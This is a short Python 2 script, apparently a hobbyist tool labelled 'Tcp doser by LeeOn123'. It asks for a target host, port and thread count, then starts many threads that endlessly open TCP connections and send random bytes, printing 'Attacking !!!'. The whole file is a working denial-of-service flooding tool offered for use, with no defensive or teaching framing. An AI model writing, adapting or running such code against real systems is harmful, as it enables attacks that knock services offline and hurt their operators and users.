import threading
import socket
import random
import time

print '''
###############################
######  ######    Tcp doser   #
##### () #####   by LeeOn123  #
####      ####                #
###############################'''
time.sleep(0.5)
ip = raw_input("Url/ip:")
port = input("Port:")
thread_num = input("Threads:")
print "Attacking !!! Thread:",thread_num

def run():
	bytes = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port))) 
			s.send(bytes)
			print "Request send!"
		except:
			s.close()
			print "Error, socket close"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
